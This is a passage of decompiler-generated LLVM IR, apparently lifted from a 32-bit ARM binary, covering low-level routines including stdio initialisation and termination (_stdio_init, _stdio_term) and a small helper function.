  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f63c = icmp eq i32 %v1_f638, 0
  %v0_f640 = load i32, i32* @r5, align 4
  %v1_f640 = load i32, i32* @r1, align 4
  %v2_f640 = inttoptr i32 %v1_f640 to i32*
  store i32 %v0_f640, i32* %v2_f640, align 4
  %v0_f644 = load i32, i32* %r3.global-to-local, align 4
  %v1_f644 = load i32, i32* %r0.global-to-local, align 4
  %v2_f644 = add i32 %v1_f644, 4
  %v3_f644 = inttoptr i32 %v2_f644 to i32*
  store i32 %v0_f644, i32* %v3_f644, align 4
  br i1 %v2_f63c, label %dec_label_pc_f64c, label %dec_label_pc_f6ac

dec_label_pc_f64c:                                ; preds = %dec_label_pc_f610
  %v0_f64c = load i32, i32* %r3.global-to-local, align 4
  %v1_f64c = load i32, i32* %r0.global-to-local, align 4
  %v2_f64c = add i32 %v1_f64c, 8
  %v3_f64c = inttoptr i32 %v2_f64c to i32*
  store i32 %v0_f64c, i32* %v3_f64c, align 4
  %v0_f650 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f650, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f654

dec_label_pc_f654:                                ; preds = %dec_label_pc_f684.dec_label_pc_f654_crit_edge, %dec_label_pc_f64c
  %v0_f654 = phi i32 [ %v0_f654.pre, %dec_label_pc_f684.dec_label_pc_f654_crit_edge ], [ %v0_f650, %dec_label_pc_f64c ]
  %v1_f654 = inttoptr i32 %v0_f654 to i32*
  %v2_f654 = load i32, i32* %v1_f654, align 4
  store i32 %v2_f654, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_f654, i32* @r2, align 4
  %v2_f66083 = load i32, i32* %v1_f654, align 4
  store i32 %v2_f66083, i32* %r3.global-to-local, align 4
  %v3_f66485 = icmp uge i32 %v2_f66083, %v2_f654
  store i1 %v3_f66485, i1* %cpsr_c.global-to-local, align 1
  %v9_f66491 = icmp eq i32 %v2_f66083, %v2_f654
  br i1 %v9_f66491, label %dec_label_pc_f66c, label %dec_label_pc_f684

dec_label_pc_f66c:                                ; preds = %dec_label_pc_f654, %dec_label_pc_f66c.dec_label_pc_f660_crit_edge
  %v0_f66c92 = phi i32 [ %v1_f664.pre, %dec_label_pc_f66c.dec_label_pc_f660_crit_edge ], [ %v2_f654, %dec_label_pc_f654 ]
  store i32 %v0_f66c92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_f67c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f67c, label %dec_label_pc_f680, label %dec_label_pc_f66c.dec_label_pc_f660_crit_edge

dec_label_pc_f66c.dec_label_pc_f660_crit_edge:    ; preds = %dec_label_pc_f66c
  %v0_f660.pre = load i32, i32* @r2, align 4
  %v1_f664.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_f660 = inttoptr i32 %v0_f660.pre to i32*
  %v2_f660 = load i32, i32* %v1_f660, align 4
  store i32 %v2_f660, i32* %r3.global-to-local, align 4
  %v3_f664 = icmp uge i32 %v2_f660, %v1_f664.pre
  store i1 %v3_f664, i1* %cpsr_c.global-to-local, align 1
  %v9_f664 = icmp eq i32 %v2_f660, %v1_f664.pre
  br i1 %v9_f664, label %dec_label_pc_f66c, label %dec_label_pc_f684

dec_label_pc_f680:                                ; preds = %dec_label_pc_f66c
  %v0_f680 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f680, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f684

dec_label_pc_f684:                                ; preds = %dec_label_pc_f654, %dec_label_pc_f66c.dec_label_pc_f660_crit_edge, %dec_label_pc_f680
  %v0_f68c = phi i32 [ %v0_f680, %dec_label_pc_f680 ], [ %v2_f66083, %dec_label_pc_f654 ], [ %v2_f660, %dec_label_pc_f66c.dec_label_pc_f660_crit_edge ]
  %v1_f684 = phi i32 [ %v0_f680, %dec_label_pc_f680 ], [ %v2_f654, %dec_label_pc_f654 ], [ %v1_f664.pre, %dec_label_pc_f66c.dec_label_pc_f660_crit_edge ]
  %v3_f684 = icmp uge i32 %v0_f68c, %v1_f684
  store i1 %v3_f684, i1* %cpsr_c.global-to-local, align 1
  %v9_f684 = icmp eq i32 %v0_f68c, %v1_f684
  br i1 %v9_f684, label %dec_label_pc_f68c, label %dec_label_pc_f684.dec_label_pc_f654_crit_edge

dec_label_pc_f684.dec_label_pc_f654_crit_edge:    ; preds = %dec_label_pc_f684
  %v0_f654.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f654

dec_label_pc_f68c:                                ; preds = %dec_label_pc_f684
  %v2_f68c = icmp ne i32 %v1_f684, 0
  store i1 %v2_f68c, i1* %cpsr_c.global-to-local, align 1
  %v7_f690 = icmp slt i32 %v1_f684, 2
  br i1 %v7_f690, label %dec_label_pc_f6ac, label %dec_label_pc_f694

dec_label_pc_f694:                                ; preds = %dec_label_pc_f68c
  %v0_f694 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_f694, i32* %r0.global-to-local, align 4
  %v0_f698 = load i32, i32* @r1, align 4
  %v1_f698 = add i32 %v0_f698, 129
  store i32 %v1_f698, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f6ac

dec_label_pc_f6ac:                                ; preds = %dec_label_pc_f610, %dec_label_pc_f694, %dec_label_pc_f68c
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_f6b0 = load i32, i32* @r8, align 4
  %v2_f6b0 = add i32 %v0_f6b0, 168
  %v3_f6b0 = inttoptr i32 %v2_f6b0 to i32*
  %v4_f6b0 = load i32, i32* %v3_f6b0, align 4
  store i32 %v4_f6b0, i32* %r0.global-to-local, align 4
  %v1_f6b4 = add i32 %v4_f6b0, 4
  %v2_f6b4 = inttoptr i32 %v1_f6b4 to i32*
  %v3_f6b4 = load i32, i32* %v2_f6b4, align 4
  %v1_f6b8 = add i32 %v3_f6b4, -1
  store i32 %v1_f6b8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f6bc = icmp eq i32 %v1_f6b8, 0
  store i32 %v1_f6b8, i32* %v2_f6b4, align 4
  br i1 %v2_f6bc, label %dec_label_pc_f6c8, label %dec_label_pc_f730

dec_label_pc_f6c8:                                ; preds = %dec_label_pc_f6ac
  %v0_f6c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_f6c8 = load i32, i32* %r0.global-to-local, align 4
  %v2_f6c8 = add i32 %v1_f6c8, 8
  %v3_f6c8 = inttoptr i32 %v2_f6c8 to i32*
  store i32 %v0_f6c8, i32* %v3_f6c8, align 4
  %v0_f6cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f6cc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f6d0

dec_label_pc_f6d0:                                ; preds = %dec_label_pc_f700.dec_label_pc_f6d0_crit_edge, %dec_label_pc_f6c8
  %v0_f6d0 = phi i32 [ %v0_f6d0.pre, %dec_label_pc_f700.dec_label_pc_f6d0_crit_edge ], [ %v0_f6cc, %dec_label_pc_f6c8 ]
  %v1_f6d0 = inttoptr i32 %v0_f6d0 to i32*
  %v2_f6d0 = load i32, i32* %v1_f6d0, align 4
  store i32 %v2_f6d0, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_f6d0, i32* @r2, align 4
  %v2_f6dc71 = load i32, i32* %v1_f6d0, align 4
  store i32 %v2_f6dc71, i32* %r3.global-to-local, align 4
  %v3_f6e073 = icmp uge i32 %v2_f6dc71, %v2_f6d0
  store i1 %v3_f6e073, i1* %cpsr_c.global-to-local, align 1
  %v9_f6e079 = icmp eq i32 %v2_f6dc71, %v2_f6d0
  br i1 %v9_f6e079, label %dec_label_pc_f6e8, label %dec_label_pc_f700

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f6d0, %dec_label_pc_f6e8.dec_label_pc_f6dc_crit_edge
  %v0_f6e880 = phi i32 [ %v1_f6e0.pre, %dec_label_pc_f6e8.dec_label_pc_f6dc_crit_edge ], [ %v2_f6d0, %dec_label_pc_f6d0 ]
  store i32 %v0_f6e880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_f6f8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f6f8, label %dec_label_pc_f6fc, label %dec_label_pc_f6e8.dec_label_pc_f6dc_crit_edge

dec_label_pc_f6e8.dec_label_pc_f6dc_crit_edge:    ; preds = %dec_label_pc_f6e8
  %v0_f6dc.pre = load i32, i32* @r2, align 4
  %v1_f6e0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_f6dc = inttoptr i32 %v0_f6dc.pre to i32*
  %v2_f6dc = load i32, i32* %v1_f6dc, align 4
  store i32 %v2_f6dc, i32* %r3.global-to-local, align 4
  %v3_f6e0 = icmp uge i32 %v2_f6dc, %v1_f6e0.pre
  store i1 %v3_f6e0, i1* %cpsr_c.global-to-local, align 1
  %v9_f6e0 = icmp eq i32 %v2_f6dc, %v1_f6e0.pre
  br i1 %v9_f6e0, label %dec_label_pc_f6e8, label %dec_label_pc_f700

dec_label_pc_f6fc:                                ; preds = %dec_label_pc_f6e8
  %v0_f6fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f6fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f700

dec_label_pc_f700:                                ; preds = %dec_label_pc_f6d0, %dec_label_pc_f6e8.dec_label_pc_f6dc_crit_edge, %dec_label_pc_f6fc
  %v0_f708 = phi i32 [ %v0_f6fc, %dec_label_pc_f6fc ], [ %v2_f6dc71, %dec_label_pc_f6d0 ], [ %v2_f6dc, %dec_label_pc_f6e8.dec_label_pc_f6dc_crit_edge ]
  %v1_f700 = phi i32 [ %v0_f6fc, %dec_label_pc_f6fc ], [ %v2_f6d0, %dec_label_pc_f6d0 ], [ %v1_f6e0.pre, %dec_label_pc_f6e8.dec_label_pc_f6dc_crit_edge ]
  %v3_f700 = icmp uge i32 %v0_f708, %v1_f700
  store i1 %v3_f700, i1* %cpsr_c.global-to-local, align 1
  %v9_f700 = icmp eq i32 %v0_f708, %v1_f700
  br i1 %v9_f700, label %dec_label_pc_f708, label %dec_label_pc_f700.dec_label_pc_f6d0_crit_edge

dec_label_pc_f700.dec_label_pc_f6d0_crit_edge:    ; preds = %dec_label_pc_f700
  %v0_f6d0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f6d0

dec_label_pc_f708:                                ; preds = %dec_label_pc_f700
  %v2_f708 = icmp ne i32 %v1_f700, 0
  store i1 %v2_f708, i1* %cpsr_c.global-to-local, align 1
  %v7_f70c = icmp slt i32 %v1_f700, 2
  br i1 %v7_f70c, label %dec_label_pc_f730, label %dec_label_pc_f710

dec_label_pc_f710:                                ; preds = %dec_label_pc_f708
  %v0_f710 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_f710, i32* %r0.global-to-local, align 4
  %v0_f714 = load i32, i32* @r1, align 4
  %v1_f714 = add i32 %v0_f714, 129
  store i32 %v1_f714, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_f730

dec_label_pc_f72c:                                ; preds = %dec_label_pc_f370, %dec_label_pc_f354, %dec_label_pc_f37c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_f730

dec_label_pc_f730:                                ; preds = %dec_label_pc_f6ac, %bb57, %dec_label_pc_f3b4, %dec_label_pc_f708, %dec_label_pc_f710, %dec_label_pc_f72c
  %v0_f730 = load i32, i32* @r5, align 4
  store i32 %v0_f730, i32* %r0.global-to-local, align 4
  %v2_f738 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_f738, i32* @r4, align 4
  store i32 %v6_f314, i32* @r5, align 4
  store i32 %v9_f314, i32* @r6, align 4
  store i32 %v12_f314, i32* @r7, align 4
  store i32 %v15_f314, i32* @r8, align 4
  ret i32 %v0_f730

; uselistorder directives
  uselistorder i32 %v0_f6fc, { 1, 0, 2 }
  uselistorder i32 %v1_f6e0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f6d0, { 1, 0 }
  uselistorder i32 %v0_f680, { 1, 0, 2 }
  uselistorder i32 %v1_f664.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f654, { 1, 0 }
  uselistorder i32 %v0_f5fc, { 1, 0, 2 }
  uselistorder i32 %v1_f5e0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_f594, { 1, 0, 2 }
  uselistorder i32 %v1_f578, { 0, 2, 1 }
  uselistorder i32 %v4_f554, { 2, 1, 0, 3 }
  uselistorder i32 %v1_f504.pre, { 2, 1, 0 }
  uselistorder i32 %v0_f488, { 1, 2, 0 }
  uselistorder i32 %v1_f418, { 1, 0 }
  uselistorder i32 %v0_f418, { 1, 0 }
  uselistorder i32 %v1_f400, { 1, 2, 0, 3 }
  uselistorder i32 %v1_f3a4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 3, 5, 4, 6, 7, 9, 8, 10, 12, 11, 13, 14, 0, 1, 2 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 6, 5, 7, 9, 8, 10, 12, 11, 13, 0, 1, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 28, 29, 31, 30, 53, 32, 33, 34, 35, 36, 38, 37, 0, 40, 39, 41, 42, 43, 44, 45, 46, 48, 47, 27, 49, 50, 51, 52, 2, 3, 4, 5, 6, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 25, 26 }
  uselistorder i32* %r2.global-to-local, { 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25, 27, 28, 29, 30, 0, 1, 3, 2, 4, 6, 5, 10, 7, 8, 9, 12, 11, 13, 14 }
  uselistorder i1* %cpsr_c.global-to-local, { 23, 24, 26, 25, 1, 27, 28, 29, 31, 30, 0, 32, 33, 35, 34, 22, 36, 37, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 16384, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_open, { 1, 0 }
  uselistorder i32 131072, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 5, 6, 0, 4, 3, 2, 1 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_f730, { 5, 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_f72c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f700, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f6e8, { 1, 0 }
  uselistorder label %dec_label_pc_f6ac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f684, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f66c, { 1, 0 }
  uselistorder label %dec_label_pc_f610, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_f600, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f5e8, { 1, 0 }
  uselistorder label %dec_label_pc_f5a8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_f598, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f4e0, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_f448._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_f3f0, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_f38c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f354, { 1, 2, 0 }
}

define i32 @function_f744(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f744:
  %v0_f744 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f744, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_f744
  %v5_f744 = sdiv i32 %arg2, 16
  %v6_f744 = and i32 %v5_f744, %arg1
  %v5_f748 = sdiv i32 %arg2, 256
  %v6_f748 = and i32 %v6_f744, %v5_f748
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_f744, %bb
  %v7_f74c = phi i32 [ %arg1, %dec_label_pc_f744 ], [ %v6_f748, %bb ]
  ret i32 %v7_f74c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_f77c = call i32 @__aeabi_read_tp()
  %v3_f780 = load i16, i16* @global_var_222f0.75, align 2
  %v4_f780 = sext i16 %v3_f780 to i32
  store i32 %v4_f780, i32* @r3, align 4
  store i32 %v0_f77c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_f78c = add i32 %v4_f780, %v0_f77c
  %v3_f78c = inttoptr i32 %v2_f78c to i32*
  %v4_f78c = load i32, i32* %v3_f78c, align 4
  store i32 %v4_f78c, i32* @r6, align 4
  %v1_f790 = call i32 @isatty(i32 0)
  %v2_f798 = icmp eq i32 %v1_f790, 0
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r4, align 4
  br i1 %v2_f798, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_f7a4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 492) to i16*), align 4
  %v7_f7a4 = zext i16 %v5_f7a4 to i32
  %v2_f7a8 = xor i32 %v7_f7a4, 256
  store i32 %v2_f7a8, i32* @r3, align 4
  %v2_f7ac = trunc i32 %v2_f7a8 to i16
  store i16 %v2_f7ac, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 492) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_f7b4 = call i32 @isatty(i32 1)
  %v2_f7b8 = icmp eq i32 %v1_f7b4, 0
  br i1 %v2_f7b8, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_f7c0 = load i32, i32* @r4, align 4
  %v2_f7c4 = add i32 %v1_f7c0, 560
  %v3_f7c4 = inttoptr i32 %v2_f7c4 to i16*
  %v4_f7c4 = load i16, i16* %v3_f7c4, align 2
  %v2_f7c8 = xor i16 %v4_f7c4, 256
  store i16 %v2_f7c8, i16* %v3_f7c4, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_f7d4 = load i16, i16* @global_var_222f0.75, align 2
  %v4_f7d4 = sext i16 %v3_f7d4 to i32
  %v0_f7d8 = load i32, i32* @r6, align 4
  %v1_f7d8 = load i32, i32* @r5, align 4
  %v3_f7d8 = add i32 %v1_f7d8, %v4_f7d4
  %v4_f7d8 = inttoptr i32 %v3_f7d8 to i32*
  store i32 %v0_f7d8, i32* %v4_f7d8, align 4
  ret i32 %v1_f7b4

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_f7f4 = load i32, i32* @r4, align 4
  store i32 %v3_f7f4, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37228), i32* %r3.global-to-local, align 4
  %v2_f808 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37228) to i32*), align 4
  store i32 %v2_f808, i32* %r0.global-to-local, align 4
  %v5_f808 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37224) to i32*), align 4
  store i32 %v5_f808, i32* %r1.global-to-local, align 4
  %v8_f808 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37220) to i32*), align 4
  %v2_f810 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_f810, i32* %r3.global-to-local, align 4
  store i32 %v2_f808, i32* %stack_var_-44, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v4_f81c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 160) to i32*), align 4
  store i32 %v2_f808, i32* %r0.global-to-local, align 4
  store i32 %v5_f808, i32* %r1.global-to-local, align 4
  store i32 %v8_f808, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37240), i32* %r3.global-to-local, align 4
  %v1_f82c = inttoptr i32 %v4_f81c to i32*
  store i32 %v2_f808, i32* %v1_f82c, align 4
  %v3_f82c = add i32 %v4_f81c, 4
  %v4_f82c = inttoptr i32 %v3_f82c to i32*
  %v5_f82c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_f82c, i32* %v4_f82c, align 4
  %v6_f82c = add i32 %v4_f81c, 8
  %v7_f82c = inttoptr i32 %v6_f82c to i32*
  %v8_f82c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_f82c, i32* %v7_f82c, align 4
  %v0_f830 = load i32, i32* %r3.global-to-local, align 4
  %v1_f830 = inttoptr i32 %v0_f830 to i32*
  %v2_f830 = load i32, i32* %v1_f830, align 4
  store i32 %v2_f830, i32* %r0.global-to-local, align 4
  %v3_f830 = add i32 %v0_f830, 4
  %v4_f830 = inttoptr i32 %v3_f830 to i32*
  %v5_f830 = load i32, i32* %v4_f830, align 4
  store i32 %v5_f830, i32* %r1.global-to-local, align 4
  %v6_f830 = add i32 %v0_f830, 8
  %v7_f830 = inttoptr i32 %v6_f830 to i32*
  %v8_f830 = load i32, i32* %v7_f830, align 4
  %v2_f834 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_f834, i32* %r3.global-to-local, align 4
  store i32 %v2_f830, i32* %stack_var_-56, align 4
  store i32 84, i32* %r2.global-to-local, align 4
  %v0_f840 = load i32, i32* %r7.global-to-local, align 4
  %v2_f840 = add i32 %v0_f840, 84
  %v3_f840 = inttoptr i32 %v2_f840 to i32*
  %v4_f840 = load i32, i32* %v3_f840, align 4
  store i32 %v4_f840, i32* %r1.global-to-local, align 4
  store i32 168, i32* %r2.global-to-local, align 4
  %v1_f848 = inttoptr i32 %v4_f840 to i32*
  %v2_f848 = load i32, i32* %v1_f848, align 4
  store i32 %v2_f848, i32* %r5.global-to-local, align 4
  %v2_f84c = add i32 %v0_f840, 168
  %v3_f84c = inttoptr i32 %v2_f84c to i32*
  %v4_f84c = load i32, i32* %v3_f84c, align 4
  store i32 %v2_f830, i32* %r0.global-to-local, align 4
  store i32 %v5_f830, i32* %r1.global-to-local, align 4
  store i32 %v8_f830, i32* %r2.global-to-local, align 4
  store i32 -37252, i32* %r3.global-to-local, align 4
  %v2_f85c = add i32 %v0_f840, -37252
  store i32 %v2_f85c, i32* %sl.global-to-local, align 4
  %v1_f860 = inttoptr i32 %v4_f84c to i32*
  store i32 %v2_f830, i32* %v1_f860, align 4
  %v3_f860 = add i32 %v4_f84c, 4
  %v4_f860 = inttoptr i32 %v3_f860 to i32*
  %v5_f860 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_f860, i32* %v4_f860, align 4
  %v6_f860 = add i32 %v4_f84c, 8
  %v7_f860 = inttoptr i32 %v6_f860 to i32*
  %v8_f860 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_f860, i32* %v7_f860, align 4
  %v0_f8f0.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8f016 = icmp eq i32 %v0_f8f0.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_f8f818 = add i32 %v0_f8f0.pr, 56
  store i32 %v1_f8f818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_f8f016, label %dec_label_pc_f904, label %dec_label_pc_f868

dec_label_pc_f868:                                ; preds = %entry, %.thread10
  %v0_f868 = phi i32 [ %v3_f8ec, %.thread10 ], [ %v0_f8f0.pr, %entry ]
  %v1_f868 = add i32 %v0_f868, 64
  %v2_f868 = inttoptr i32 %v1_f868 to i32*
  %v3_f868 = load i32, i32* %v2_f868, align 4
  store i32 %v3_f868, i32* %r3.global-to-local, align 4
  %v0_f86c = call i32 @__aeabi_read_tp()
  store i32 %v0_f86c, i32* %r0.global-to-local, align 4
  %v1_f870 = add i32 %v0_f86c, -1168
  store i32 %v1_f870, i32* %r6.global-to-local, align 4
  %v3_f874 = icmp uge i32 %v3_f868, %v1_f870
  store i1 %v3_f874, i1* %cpsr_c.global-to-local, align 1
  %v9_f874 = icmp eq i32 %v3_f868, %v1_f870
  br i1 %v9_f874, label %.thread1, label %dec_label_pc_f888

.thread1:                                         ; preds = %dec_label_pc_f868
  %v1_f878 = load i32, i32* %r5.global-to-local, align 4
  %v2_f878 = add i32 %v1_f878, 60
  %v3_f878 = inttoptr i32 %v2_f878 to i32*
  %v4_f878 = load i32, i32* %v3_f878, align 4
  %v2_f87c = add i32 %v4_f878, 1
  store i32 %v2_f87c, i32* %r3.global-to-local, align 4
  store i32 %v2_f87c, i32* %v3_f878, align 4
  br label %.thread10

dec_label_pc_f888:                                ; preds = %dec_label_pc_f868, %dec_label_pc_f894
  %v0_f888 = load i32, i32* %r2.global-to-local, align 4
  %v1_f888 = inttoptr i32 %v0_f888 to i32*
  %v2_f888 = load i32, i32* %v1_f888, align 4
  store i32 %v2_f888, i32* %r3.global-to-local, align 4
  %v1_f88c = load i32, i32* %r4.global-to-local, align 4
  %v3_f88c = icmp uge i32 %v2_f888, %v1_f88c
  store i1 %v3_f88c, i1* %cpsr_c.global-to-local, align 1
  %v9_f88c = icmp eq i32 %v2_f888, %v1_f88c
  br i1 %v9_f88c, label %dec_label_pc_f894, label %dec_label_pc_f8ac

dec_label_pc_f894:                                ; preds = %dec_label_pc_f888
  store i32 %v2_f888, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_f8a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_f8a4, label %dec_label_pc_f8a8, label %dec_label_pc_f888

dec_label_pc_f8a8:                                ; preds = %dec_label_pc_f894
  %v0_f8a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f8a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f8ac

dec_label_pc_f8ac:                                ; preds = %dec_label_pc_f888, %dec_label_pc_f8a8
  %v0_f8ac = phi i32 [ %v0_f8a8, %dec_label_pc_f8a8 ], [ %v2_f888, %dec_label_pc_f888 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8ac = icmp eq i32 %v0_f8ac, 0
  %v2_f8b8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_f8ac, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_f8ac
  %v1_f8b8 = load i32, i32* %r6.global-to-local, align 4
  %v3_f8b8 = add i32 %v2_f8b8.pre, 64
  %v4_f8b8 = inttoptr i32 %v3_f8b8 to i32*
  store i32 %v1_f8b8, i32* %v4_f8b8, align 4
  %v1_f8bc = load i32, i32* %r1.global-to-local, align 4
  %v2_f8bc = load i32, i32* %r5.global-to-local, align 4
  %v3_f8bc = add i32 %v2_f8bc, 60
  %v4_f8bc = inttoptr i32 %v3_f8bc to i32*
  store i32 %v1_f8bc, i32* %v4_f8bc, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_f8ac
  %v2_f8b0 = add i32 %v2_f8b8.pre, 8
  %v3_f8b0 = inttoptr i32 %v2_f8b0 to i32*
  %v4_f8b0 = load i32, i32* %v3_f8b0, align 4
  store i32 %v4_f8b0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_f8c0 = add i32 %v2_f8b8.pre, 20
  %v4_f8c0 = inttoptr i32 %v3_f8c0 to i32*
  store i32 %v4_f8b0, i32* %v4_f8c0, align 4
  %v1_f8c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_f8c4 = trunc i32 %v1_f8c4 to i16
  %v3_f8c4 = load i32, i32* %r5.global-to-local, align 4
  %v4_f8c4 = inttoptr i32 %v3_f8c4 to i16*
  store i16 %v2_f8c4, i16* %v4_f8c4, align 2
  %v1_f8c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_f8c8 = load i32, i32* %r5.global-to-local, align 4
  %v3_f8c8 = add i32 %v2_f8c8, 24
  %v4_f8c8 = inttoptr i32 %v3_f8c8 to i32*
